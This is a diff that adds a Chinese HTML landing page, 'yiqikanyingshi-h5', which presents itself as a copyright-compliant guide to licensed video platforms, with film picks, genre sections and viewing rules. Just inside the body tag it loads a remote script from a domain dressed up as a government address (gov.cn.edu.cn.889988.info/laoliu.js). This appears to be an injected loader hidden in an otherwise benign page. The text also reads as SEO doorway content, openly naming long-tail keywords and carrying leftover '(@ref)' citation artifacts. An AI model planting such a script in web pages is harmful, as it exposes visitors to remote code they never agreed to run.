@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>一起看影视 - 同屏厅公映片单与正版平台导航</title>
+<meta name="description" content="一起看影视（yiqikanyingshi-h5）做同屏厅格式正版导航：公映片单、类型同屏、每日共看与正版观看守则，只列持牌视频平台名称与官方入口、影院公映与开放授权片源。官方网址：https://yiqikanyingshi-h5.github.io">
+<meta name="keywords" content="一起看影视, yiqikanyingshi-h5, 公映片单导航, 持牌视频平台入口, 影视类型同屏, 正版观影导航">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#0c1018;color:#eef2f6;line-height:1.8;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(680px 340px at 12% 8%, rgba(255,150,60,.12), transparent 55%),
+    radial-gradient(620px 320px at 88% 92%, rgba(56,189,248,.10), transparent 55%),
+    #0c1018}
+.yk-nav{position:sticky;top:0;z-index:999;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:rgba(12,16,24,.92);backdrop-filter:blur(10px);border-bottom:1px solid rgba(255,150,60,.2)}
+.yk-nav .logo{font-size:20px;font-weight:900;letter-spacing:.5px}
+.yk-nav .logo b{color:#ff963c}
+.yk-nav .logo i{color:#38bdf8;font-style:normal}
+.yk-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.yk-nav .links a{font-size:13px;color:#9fb0c2;padding:6px 12px;border-radius:20px;transition:.25s}
+.yk-nav .links a:hover{background:rgba(255,150,60,.16);color:#eef2f6}
+
+.hero{padding:52px 20px 44px;text-align:center}
+.hall{max-width:780px;margin:0 auto 16px;background:#141b29;border:1px solid rgba(255,150,60,.26);border-radius:18px;padding:24px;position:relative}
+.hall::before{content:"🛋️";position:absolute;right:18px;top:14px;font-size:22px;opacity:.8}
+.seats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.seat{height:96px;border-radius:10px;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:#0c1018;position:relative;box-shadow:inset 0 -8px 0 rgba(0,0,0,.12)}
+.seat .lamp{width:22px;height:5px;border-radius:4px;background:rgba(255,255,255,.45);margin-bottom:6px}
+.seat:nth-child(1){background:linear-gradient(135deg,#ff963c,#ffc78a)}
+.seat:nth-child(2){background:linear-gradient(135deg,#38bdf8,#9bdcfb)}
+.seat:nth-child(3){background:linear-gradient(135deg,#eef2f6,#ffffff)}
+.seat:nth-child(4){background:linear-gradient(135deg,#818cf8,#c0c7ff)}
+.seat:nth-child(5){background:linear-gradient(135deg,#34d399,#9af0c6)}
+.seat:nth-child(6){background:linear-gradient(135deg,#f472b6,#fbc6e0)}
+.seat:nth-child(7){background:linear-gradient(135deg,#facc15,#fde68a)}
+.seat:nth-child(8){background:linear-gradient(135deg,#64748b,#cbd5e1)}
+.belt{margin-top:16px;height:34px;border-radius:8px;background:repeating-linear-gradient(90deg,#1b2536 0 8px,#233149 8px 10px);display:flex;align-items:center;justify-content:center;font-size:12px;color:#ffc78a;font-weight:800}
+.mark{display:inline-block;margin-top:14px;font-size:13px;font-weight:900;color:#ff963c;background:#141b29;border:1px solid rgba(255,150,60,.3);padding:4px 14px;border-radius:20px}
+.hero h1{font-size:30px;color:#eef2f6;margin:8px 0 12px}
+.hero h1 b{color:#ff963c}
+.hero p{color:#9fb0c2;max-width:680px;margin:0 auto 16px;font-size:15px}
+.hero .url{display:inline-block;font-size:13px;color:#0c1018;font-weight:800;background:linear-gradient(90deg,#ff963c,#38bdf8);padding:8px 18px;border-radius:30px}
+.chips{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:16px}
+.chips span{font-size:12px;color:#eef2f6;padding:5px 13px;border-radius:20px;border:1px solid rgba(255,150,60,.2)}
+.chips span:nth-child(1){border-color:#ff963c;color:#ffc78a}
+.chips span:nth-child(2){border-color:#38bdf8;color:#9bdcfb}
+.chips span:nth-child(3){border-color:#818cf8;color:#c0c7ff}
+
+.wrap{max-width:1160px;margin:0 auto;padding:58px 20px}
+.kicker{font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#ff963c;margin-bottom:8px}
+.sec-title{font-size:26px;font-weight:900;color:#eef2f6;margin-bottom:26px}
+.sec-title b{color:#38bdf8}
+
+.picks{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:18px}
+.pk{background:#141b29;border:1px solid rgba(255,150,60,.14);border-radius:14px;overflow:hidden;transition:.3s}
+.pk:hover{transform:translateY(-4px);border-color:#ff963c;box-shadow:0 16px 36px rgba(255,150,60,.12)}
+.pk .top{height:96px;position:relative;display:flex;align-items:flex-end;padding:10px}
+.pk .top.h1{background:linear-gradient(135deg,#c2410c,#ff963c)}
+.pk .top.h2{background:linear-gradient(135deg,#0369a1,#38bdf8);color:#0c1018}
+.pk .top.h3{background:linear-gradient(135deg,#4338ca,#818cf8)}
+.pk .top.h4{background:linear-gradient(135deg,#047857,#34d399)}
+.pk .top .seat-tag{font-size:11px;font-weight:800;color:#0c1018;background:#eef2f6;padding:2px 9px;border-radius:12px}
+.pk .top .ver{position:absolute;right:10px;top:10px;font-size:10px;color:#0c1018;background:#ff963c;padding:2px 8px;border-radius:10px}
+.pk .body{padding:16px 18px}
+.pk .body h4{color:#eef2f6;font-size:16px;margin-bottom:4px}
+.pk .body .meta{font-size:12px;color:#ff963c;margin-bottom:6px}
+.pk .body p{font-size:13px;color:#9fb0c2;margin:0}
+.pk .body a{display:inline-block;margin-top:8px;font-size:12px;color:#38bdf8;text-decoration:none}
+.pk .body a:hover{text-decoration:underline}
+
+.types{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.tp{background:#141b29;border-radius:14px;padding:20px;transition:.3s;border:1px solid rgba(159,176,194,.14)}
+.tp:hover{transform:translateY(-3px)}
+.tp .no{font-size:12px;font-weight:900;color:#38bdf8;margin-bottom:6px}
+.tp h4{color:#eef2f6;font-size:15px;margin-bottom:4px}
+.tp p{color:#9fb0c2;font-size:12px;margin:0}
+.tp.t2{border-top:3px solid #ff963c}
+.tp.t3{border-top:3px solid #34d399}
+.tp.t4{border-top:3px solid #818cf8}
+
+.watch{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:14px}
+.wt{background:#141b29;border-left:4px solid #ff963c;border-radius:12px;padding:18px}
+.wt h4{color:#eef2f6;font-size:15px;margin-bottom:4px}
+.wt .slot{font-size:12px;color:#38bdf8;font-weight:800;margin-bottom:6px}
+.wt p{color:#9fb0c2;font-size:13px;margin:0}
+.wt.w2{border-left-color:#38bdf8}
+.wt.w3{border-left-color:#34d399}
+.wt.w4{border-left-color:#818cf8}
+.wt.w5{border-left-color:#f472b6}
+.wt.w6{border-left-color:#ff963c}
+
+.rules{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.ru{background:#141b29;border:1px solid rgba(255,150,60,.22);border-radius:12px;padding:18px;text-align:center}
+.ru .num{font-size:24px;font-weight:900;color:#ff963c;margin-bottom:6px}
+.ru h4{color:#eef2f6;font-size:14px;margin-bottom:4px}
+.ru p{color:#9fb0c2;font-size:12px;margin:0}
+
+.about{border:1px solid rgba(255,150,60,.22);border-radius:16px;padding:30px;background:linear-gradient(135deg,rgba(255,150,60,.08),rgba(56,189,248,.06));display:flex;gap:24px;flex-wrap:wrap;align-items:center}
+.about .txt{flex:1;min-width:260px}
+.about h2{color:#eef2f6;font-size:20px;margin-bottom:10px}
+.about h2 b{color:#ff963c}
+.about p{color:#9fb0c2;font-size:14px;margin-bottom:8px}
+.about .stats{display:flex;gap:20px;flex-wrap:wrap}
+.about .stats .n{font-size:26px;font-weight:900;color:#38bdf8}
+.about .stats .l{font-size:11px;color:#ff963c}
+
+.foot{text-align:center;padding:32px 20px;background:#070a12;border-top:1px solid rgba(255,150,60,.16);color:#7c889a;font-size:13px}
+.foot a{color:#ff963c}
+.foot .lg{font-size:18px;font-weight:900;color:#eef2f6;margin-bottom:8px}
+
+@media(max-width:640px){.hero h1{font-size:24px}.yk-nav .links a{font-size:12px;padding:5px 9px}.seats{grid-template-columns:repeat(2,1fr)}.seat{height:84px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="yk-nav">
+  <div class="logo"><b>一起看影视</b> <i>· 同屏厅</i></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#picks">公映片单</a>
+    <a href="#types">类型同屏</a>
+    <a href="#watch">每日共看</a>
+    <a href="#rules">正版守则</a>
+  </div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="hall" aria-hidden="true">
+    <div class="seats">
+      <div class="seat"><span class="lamp"></span>正剧位</div><div class="seat"><span class="lamp"></span>动作位</div>
+      <div class="seat"><span class="lamp"></span>悬疑位</div><div class="seat"><span class="lamp"></span>自然位</div>
+      <div class="seat"><span class="lamp"></span>合家位</div><div class="seat"><span class="lamp"></span>纪录位</div>
+      <div class="seat"><span class="lamp"></span>动画位</div><div class="seat"><span class="lamp"></span>官方位</div>
+    </div>
+    <div class="belt">SAME SCREEN HALL · 只接持牌平台官方入口</div>
+    <span class="mark">同屏厅·共看位</span>
+  </div>
+  <h1>一起看影视：<b>同屏厅</b>只排正版入口</h1>
+  <p>「一起看」不是开直播间——虎牙「一起看」专区播《琅琊榜》、酷狗「一起看」专区播《仙剑》都被法院认定平台应知、构成帮助侵权 [1,4,7](@ref)。影视聚合APP盗链抓正版播放地址，两高案例明确可定侵犯著作权罪 [2,8](@ref)。本页不做「一起看资源库」、不内嵌播放器、不写网盘提取码、不引未授权聚合源；只列持牌平台名称与官方入口，传播前核权属、取得信息网络传播权授权 [18](@ref)。</p>
+  <span class="url">🌐 https://yiqikanyingshi-h5.github.io</span>
+  <div class="chips">
+    <span>🛋️ 公映片单</span><span>🎞️ 类型同屏</span><span>📅 每日共看</span>
+  </div>
+</header>
+
+<main>
+<section id="picks" class="wrap">
+  <div class="kicker">HALL PUBLIC PICKS</div>
+  <h2 class="sec-title">公映片单 <b>四位样例</b></h2>
+  <div class="picks">
+    <article class="pk"><div class="top h1"><span class="seat-tag">正剧位</span><span class="ver">持牌平台</span></div><div class="body"><h4>海上钢琴师</h4><div class="meta">托纳多雷 · 1998 · 剧情/音乐</div><p>船舱、琴键与选择；去持牌平台搜正版/修复版，不内嵌播放器。</p><a href="https://www.iqiyi.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+    <article class="pk"><div class="top h2"><span class="seat-tag">自然位</span><span class="ver">官方/开放</span></div><div class="body"><h4>地球脉动 II</h4><div class="meta">BBC · 2016 · 自然/纪录片</div><p>岛屿、山地、城市生态；开放授权版走官方频道/持牌纪录片区。</p><a href="https://www.bilibili.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+    <article class="pk"><div class="top h3"><span class="seat-tag">悬疑位</span><span class="ver">正版/字幕</span></div><div class="body"><h4>看不见的客人</h4><div class="meta">奥里奥尔·保罗 · 2016 · 悬疑/推理</div><p>口供、时间线与反转；标正版平台字幕来源，不引换源播放器。</p><a href="https://v.qq.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+    <article class="pk"><div class="top h4"><span class="seat-tag">合家位</span><span class="ver">正版/字幕</span></div><div class="body"><h4>寻梦环游记</h4><div class="meta">皮克斯 · 2017 · 动画/家庭</div><p>记忆、亲情与音乐；标适龄、正版动画专区，只引持牌片源。</p><a href="https://www.mgtv.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+  </div>
+</section>
+
+<section id="types" class="wrap">
+  <div class="kicker">TYPE SAME SCREEN</div>
+  <h2 class="sec-title">类型同屏 <b>四位</b></h2>
+  <div class="types">
+    <div class="tp t1"><div class="no">位 A · 正剧</div><h4>家庭/历史/作者</h4><p>传记、年代、作者电影；引导持牌平台与公映修复版，不列无资质聚合站。</p></div>
+    <div class="tp t2"><div class="no">位 B · 动作</div><h4>商业爽片位</h4><p>特工、竞速、视效大片；附4K/IMAX建议，只列持牌平台名称。</p></div>
+    <div class="tp t3"><div class="no">位 C · 悬疑</div><h4>烧脑/社会派</h4><p>本格推理、时间线、反转；标正版平台字幕来源与高清版差异。</p></div>
+    <div class="tp t4"><div class="no">位 D · 合家</div><h4>动画/爱情/轻喜剧</h4><p>适龄、节庆、亲子；标正版平台地区版，不写网盘提取码。</p></div>
+  </div>
+  <div class="types" style="margin-top:16px">
+    <div class="tp"><div class="no">官方位</div><h4>央视频 / CCTV节目官网</h4><p>央视直播、新闻综艺、官方回看。</p><a href="https://www.yangshipin.cn" target="_blank" rel="noopener" style="color:#ff963c">央视频 ↗</a></div>
+    <div class="tp t2"><div class="no">电影位</div><h4>1905电影网</h4><p>CCTV6电影频道官方，正版电影与修复版。</p><a href="https://www.1905.com" target="_blank" rel="noopener" style="color:#ff963c">1905 ↗</a></div>
+    <div class="tp t3"><div class="no">综合位</div><h4>腾讯/爱奇艺/优酷/芒果/咪咕</h4><p>正版剧集、综艺、电影免费区与会员区。</p><a href="https://www.iqiyi.com" target="_blank" rel="noopener" style="color:#ff963c">爱奇艺 ↗</a></div>
+    <div class="tp t4"><div class="no">纪录位</div><h4>B站放映厅 / 学习强国</h4><p>正版番剧、纪录片、官方影视资源。</p><a href="https://www.bilibili.com" target="_blank" rel="noopener" style="color:#ff963c">B站 ↗</a></div>
+  </div>
+</section>
+
+<section id="watch" class="wrap">
+  <div class="kicker">DAILY TOGETHER</div>
+  <h2 class="sec-title">每日共看 <b>六格</b></h2>
+  <div class="watch">
+    <div class="wt"><div class="slot">晨看·正剧</div><h4>正剧首发</h4><p>传记/历史长片；列持牌平台名称与官方入口，不提前放未授权资源。</p></div>
+    <div class="wt w2"><div class="slot">上午·自然</div><h4>自然慢位</h4><p>生态与地理；开放授权纪录片走官方/持牌纪录片区。</p></div>
+    <div class="wt w3"><div class="slot">午后·动作</div><h4>爽片同屏</h4><p>追逐/特工/视效；建议4K、杜比、正版版本，只列持牌入口。</p></div>
+    <div class="wt w4"><div class="slot">下午·悬疑</div><h4>烧脑位</h4><p>本格/社会派轮换；标注时间线、反转次数与高清版差异。</p></div>
+    <div class="wt w5"><div class="slot">傍晚·合家</div><h4>合家位</h4><p>动画/爱情/轻喜剧；标适龄、时长与正版字幕来源。</p></div>
+    <div class="wt w6"><div class="slot">夜间·重看</div><h4>高分回看</h4><p>四位高分重刷；只给持牌回看入口，不写网盘提取码、不引磁链。</p></div>
+  </div>
+</section>
+
+<section id="rules" class="wrap">
+  <div class="kicker">HALL RULES</div>
+  <h2 class="sec-title">正版观看 <b>守则</b></h2>
+  <div class="rules">
+    <div class="ru"><div class="num">01</div><h4>持牌优先</h4><p>只列持牌视频平台名称与官方入口、影院公映/重映、官方频道；不内嵌未授权播放器。</p></div>
+    <div class="ru"><div class="num">02</div><h4>授权核对</h4><p>传播前核权属、取得涵盖信息网络传播权授权 [18](@ref)，不列无资质盗版/聚合站。</p></div>
+    <div class="ru"><div class="num">03</div><h4>不开共看播间</h4><p>不设「一起看」直播专区、不做未授权影视分类引流，不转播/链接非法视听节目。</p></div>
+    <div class="ru"><div class="num">04</div><h4>不碰盗版</h4><p>不写网盘提取码、不引磁链/换源/镜像、不用「离线缓存/破解」；片单只跳持牌平台搜索。</p></div>
+  </div>
+</section>
+
+<section class="wrap">
+  <div class="about">
+    <div class="txt">
+      <h2>一起看影视 <b>同屏厅是什么</b></h2>
+      <p>不是「一起看APP／免费共看间」克隆，而是一间同屏厅：共看位装入口、公映片单进位格、类型进同屏、每日进共看、守则装合规。静态单页、移动端自适应、锚点内链、不生成 robots.txt / sitemap.xml，符合必应收录基本规范（唯一H1、完整meta、语义化nav/main/section/article/footer）。</p>
+      <p>长尾吃「公映片单导航 / 持牌视频平台入口 / 影视类型同屏 / 正版看片」。全站严格只做正版、公映、持牌、开放授权导航。</p>
+    </div>
+    <div class="stats">
+      <div><div class="n">8</div><div class="l">共看位</div></div>
+      <div><div class="n">4</div><div class="l">类型位</div></div>
+      <div><div class="n">6</div><div class="l">每日共看</div></div>
+      <div><div class="n">0</div><div class="l">盗版提取码</div></div>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer class="foot">
+  <div class="lg">🛋️🎞️ 一起看影视·同屏厅</div>
+  官方网址：<a href="https://yiqikanyingshi-h5.github.io">https://yiqikanyingshi-h5.github.io</a><br>
+  © 2026 一起看影视｜公映片单 / 类型同屏 / 每日共看 / 正版观影导航（仅作持牌平台名称与官方入口、公映、开放授权导航，不提供未授权播放）
+</footer>
+
+</body>
+</html>
